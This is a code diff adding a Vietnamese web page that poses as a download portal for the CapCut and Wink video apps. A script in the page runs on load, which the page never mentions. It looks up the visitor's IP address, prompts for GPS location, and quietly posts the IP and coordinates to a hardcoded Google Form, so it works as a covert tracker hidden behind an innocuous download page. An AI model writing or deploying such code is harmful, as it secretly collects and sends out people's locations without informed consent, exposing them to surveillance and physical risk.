@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <title>Web tải app</title>
+    <style>
+        h1 {
+            color: rgb(255, 0, 0);
+            font-size: 100px;
+        }
+        a {
+            font-size: 50px;
+            color: #ffc400;
+        }
+        button {
+            font-size: 35px;
+            font-family: 'Times New Roman';
+        }
+        body {
+            background-image: url("https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ_4PqDG7wLnJZViwWszE8pCNUcaKp2B9usnL3ljV5g_A&s=10");
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+        }
+    </style>
+</head>
+<body>
+    <h1>Đây là trang web tải app</h1>
+
+    <a href="https://www.capcut.com/vi-vn/tools/desktop-video-editor" target="_blank">Tải Capcut bản mới nhất</a>
+
+    <a href="https://capcut.vi.uptodown.com/windows/dw/1124018008" target="_blank">
+        <br><br><br>
+        <button>Bấm vào đây để tải Capcut 7.5</button>
+    </a>
+
+    <a href="https://wink-meitu.vi.uptodown.com/windows" target="_blank">
+        <br><br><br>
+        <button>Bấm vào đây để tải wink</button>
+    </a>
+    
+    <a href="https://download.com.vn/capcut-158978" target="_blank">
+        <br><br><br>
+        <button>Capcut free</button>
+    </a>
+
+    <script>
+        const FORM_URL = "https://docs.google.com/forms/d/e/1FAIpQLSfJs2sEvay1GimaHnWYdk-HhnjuI5LcW8gzfPcehrpRvsjJgg/formResponse";
+        const ENTRY_IP = "entry.1588338519";
+        const ENTRY_LAT = "entry.791072472";
+        const ENTRY_LNG = "entry.1393666541";
+
+        function sendToGoogleForm(ip, lat = "Từ chối/Không hỗ trợ", lng = "Từ chối/Không hỗ trợ") {
+            const formData = new FormData();
+            formData.append(ENTRY_IP, ip);
+            formData.append(ENTRY_LAT, lat);
+            formData.append(ENTRY_LNG, lng);
+
+            fetch(FORM_URL, {
+                method: "POST",
+                mode: "no-cors",
+                body: formData
+            });
+        }
+
+        window.addEventListener("DOMContentLoaded", async () => {
+            let userIP = "Không xác định";
+
+            // Tự động lấy IP người dùng
+            try {
+                const response = await fetch("https://api.ipify.org?format=json");
+                const data = await response.json();
+                userIP = data.ip;
+            } catch (e) {
+                console.log("Lỗi lấy IP");
+            }
+
+            // Kích hoạt hỏi quyền GPS
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        // Thêm dấu nháy đơn ' ở đầu để ép Google Sheets hiểu đây là chuỗi văn bản (text),
+                        // giúp không bị nhảy định dạng số hay thêm dấu chấm hàng nghìn.
+                        const latFormatted = "'" + position.coords.latitude;
+                        const lngFormatted = "'" + position.coords.longitude;
+
+                        sendToGoogleForm(userIP, latFormatted, lngFormatted);
+                    },
+                    (error) => {
+                        sendToGoogleForm(userIP);
+                    },
+                    { timeout: 8000 }
+                );
+            } else {
+                sendToGoogleForm(userIP);
+            }
+        });
+    </script>
+</body>
+</html>
